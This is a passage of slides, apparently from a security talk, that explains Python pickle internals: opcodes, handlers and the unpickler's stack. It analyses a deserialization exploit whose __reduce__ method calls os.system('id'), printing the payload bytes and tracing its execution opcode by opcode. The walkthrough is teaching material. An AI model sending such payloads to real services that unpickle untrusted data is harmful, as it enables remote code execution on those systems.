</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/1"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">2</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 238.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/2&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;3&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Disassembler</h4>
<blockquote class="part" data-startline="NaN" data-endline="NaN">
<p data-position="NaN" data-size="0">pickletools</p>
</blockquote>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="bash hljs">$ python3 -m pickletools -a ./data
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/2"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">3</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 113px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/3&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;4&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Important structures</h4>
<ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">stack
<ul>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">a list to store temporary data</li>
</ul>
</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">memo
<ul>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">a dict to store information when pickling</li>
</ul>
</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">metastack
<ul>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">a list to store stack (wired)</li>
</ul>
</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">dispatch
<ul>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">OPCODE handler dict</li>
</ul>
</li>
</ul>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/3"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">4</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 329px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/4&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;5&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Important opcodes</h4>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/4"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">5</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 144px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/5&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;6&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">MARK           = <span class="hljs-string">b'('</span>   <span class="hljs-comment"># push special markobject on stack</span>
STOP           = <span class="hljs-string">b'.'</span>   <span class="hljs-comment"># every pickle ends with STOP</span>
INT            = <span class="hljs-string">b'I'</span>   <span class="hljs-comment"># push integer or bool; decimal string argument</span>
LONG           = <span class="hljs-string">b'L'</span>   <span class="hljs-comment"># push long; decimal string argument</span>
REDUCE         = <span class="hljs-string">b'R'</span>   <span class="hljs-comment"># apply callable to argtuple, both on stack</span>
STRING         = <span class="hljs-string">b'S'</span>   <span class="hljs-comment"># push string; NL-terminated string argument</span>
BINUNICODE     = <span class="hljs-string">b'X'</span>   <span class="hljs-comment">#   "     "       "  ; counted UTF-8 string argument</span>
BUILD          = <span class="hljs-string">b'b'</span>   <span class="hljs-comment"># call __setstate__ or __dict__.update()</span>
GLOBAL         = <span class="hljs-string">b'c'</span>   <span class="hljs-comment"># push self.find_class(modname, name); 2 string args</span>
DICT           = <span class="hljs-string">b'd'</span>   <span class="hljs-comment"># build a dict from stack items</span>
EMPTY_DICT     = <span class="hljs-string">b'}'</span>   <span class="hljs-comment"># push empty dict</span>
INST           = <span class="hljs-string">b'i'</span>   <span class="hljs-comment"># build &amp; push class instance</span>
LIST           = <span class="hljs-string">b'l'</span>   <span class="hljs-comment"># build list from topmost stack items</span>
OBJ            = <span class="hljs-string">b'o'</span>   <span class="hljs-comment"># build &amp; push class instance</span>
BINPUT         = <span class="hljs-string">b'q'</span>   <span class="hljs-comment">#   "     "    "   "   " ;   "    " 1-byte arg</span>
TUPLE          = <span class="hljs-string">b't'</span>   <span class="hljs-comment"># build tuple from topmost stack items</span>
EMPTY_TUPLE    = <span class="hljs-string">b')'</span>   <span class="hljs-comment"># push empty tuple</span>
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/5"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">6</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 181px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/6&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;7&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">OPCODE(GLOBAL) handler</h2>
<p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">c</p>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_global</span>(<span class="hljs-params">self</span>):</span>
    module = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">"utf-8"</span>)
    name = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">"utf-8"</span>)
    klass = self.find_class(module, name)
    self.append(klass)
dispatch[GLOBAL[<span class="hljs-number">0</span>]] = load_global
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/6"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">7</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 181px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/7&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;8&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">OPCODE(REDUCE) handler</h2>
<p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">R</p>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_reduce</span>(<span class="hljs-params">self</span>):</span>
    stack = self.stack
    args = stack.pop()
    func = stack[-<span class="hljs-number">1</span>]
    stack[-<span class="hljs-number">1</span>] = func(*args)
dispatch[REDUCE[<span class="hljs-number">0</span>]] = load_reduce
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/7"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">8</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 329px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/8&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;9&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">This is why ‘R’ is disallowed</h4>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/8"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">9</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 194.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/9&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;10&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">OPCODE(MARK) handler</h2>
<p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">(</p>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_mark</span>(<span class="hljs-params">self</span>):</span>
    self.metastack.append(self.stack)
    self.stack = []
    self.append = self.stack.append
dispatch[MARK[<span class="hljs-number">0</span>]] = load_mark
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/9"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">10</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 152px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/10&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;11&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Analysis a wild exploit</h4>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> pickle

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">'id'</span>,))

payload = pickle.dumps(Exploit())
print(payload)

x = pickle.loads(payload)
print(x)
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/10"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">11</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 325.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/11&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;12&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-string">b'\x80\x03cposix\nsystem\nq\x00X\x02\x00\x00\x00idq\x01\x85q\x02Rq\x03.'</span>
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/11"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">12</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 329px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/12&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;13&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Visualization pickling process</h4>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/12"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">13</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 310px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/13&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;14&lt;/span&gt;&lt;/a&gt;"><div><ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><a href="https://docs.python.org/3/library/pickletools.html" target="_blank" rel="noopener">pickletools</a></li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Add some debug logs</li>
</ul>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/13"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">14</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 150px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/14&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;15&lt;/span&gt;&lt;/a&gt;"><div><ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><a href="https://docs.python.org/3/library/pickletools.html" target="_blank" rel="noopener">pickletools</a></li>
</ul>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="bash hljs">$ python3 -m pickletools ./payload 
    0: \x80 PROTO      3
    2: c    GLOBAL     <span class="hljs-string">'posix system'</span>
   16: q    BINPUT     0
   18: X    BINUNICODE <span class="hljs-string">'id'</span>
   25: q    BINPUT     1
   27: \x85 TUPLE1
   28: q    BINPUT     2
   30: R    REDUCE
   31: q    BINPUT     3
   33: .    STOP
highest protocol among opcodes = 2
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/14"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">15</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 204px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/15&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;16&lt;/span&gt;&lt;/a&gt;"><div><ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Add some debug logs</li>
</ul>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="diff hljs">1047,1051d1046
&lt;                 print("-" * 0x20)
&lt;                 print("Byte:", key)
&lt;                 print("Stack:", self.stack)
&lt;                 print("Meta Stack:", self.metastack)
&lt;                 print("Memo:", self.memo)
1567d1561
&lt;     raise ImportError
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/15"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">16</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 69.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/16&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;17&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Inject debug log into pickle</h4>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="bash hljs">$ tree
.
├── exploit.py
└── lib
    └── pickle.py
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> lib <span class="hljs-keyword">import</span> pickle

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">'id'</span>,))

payload = pickle.dumps(Exploit())
print(payload)

x = pickle.loads(payload)
print(x)
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/16"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">17</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/17&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;18&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">\x80\x03
cposix\nsystem\nq\x00X\x02\x00\x00\x00idq\x01\x85q\x02Rq\x03.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-comment"># PROTO Protocol version indicator.</span>

Byte: <span class="hljs-string">b'\x80'</span>
Stack: []
Meta Stack: []
Memo: {}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/17"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">18</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/18&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;19&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">cposix\nsystem\n
q\x00X\x02\x00\x00\x00idq\x01\x85q\x02Rq\x03.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">GLOBAL Push a <span class="hljs-keyword">global</span> <span class="hljs-built_in">object</span> (module.attr) on the stack.

Byte: <span class="hljs-string">b'c'</span>
Stack: []
Meta Stack: []
Memo: {}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/18"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">19</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 202.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/19&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;20&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">q\x00
X\x02\x00\x00\x00idq\x01\x85q\x02Rq\x03.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINPUT Store the stack top into the memo.
The stack <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> popped.

Byte: <span class="hljs-string">b'q'</span>
Stack: [&lt;built-<span class="hljs-keyword">in</span> function system&gt;]
Meta Stack: []
Memo: {}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/19"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">20</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/20&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;21&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">X\x02\x00\x00\x00id
q\x01\x85q\x02Rq\x03.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINUNICODE Push a Python Unicode string <span class="hljs-built_in">object</span>.

Byte: <span class="hljs-string">b'X'</span>
Stack: [&lt;built-<span class="hljs-keyword">in</span> function system&gt;]
Meta Stack: []
Memo: {<span class="hljs-number">0</span>: &lt;built-<span class="hljs-keyword">in</span> function system&gt;}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/20"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">21</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 202.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/21&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;22&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">q\x01
\x85q\x02Rq\x03.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINPUT Store the stack top into the memo.
The stack <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> popped.

Byte: <span class="hljs-string">b'q'</span>
Stack: [&lt;built-<span class="hljs-keyword">in</span> function system&gt;, <span class="hljs-string">'id'</span>]
Meta Stack: []
Memo: {<span class="hljs-number">0</span>: &lt;built-<span class="hljs-keyword">in</span> function system&gt;}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/21"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">22</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 202.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/22&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;23&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">\x85
q\x02Rq\x03.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">TUPLE1 Build a one-<span class="hljs-built_in">tuple</span> out of 
the topmost item on the stack.

Byte: <span class="hljs-string">b'\x85'</span>
Stack: [&lt;built-<span class="hljs-keyword">in</span> function system&gt;, <span class="hljs-string">'id'</span>]
Meta Stack: []
Memo: {<span class="hljs-number">0</span>: &lt;built-<span class="hljs-keyword">in</span> function system&gt;, <span class="hljs-number">1</span>: <span class="hljs-string">'id'</span>}
</code></pre>
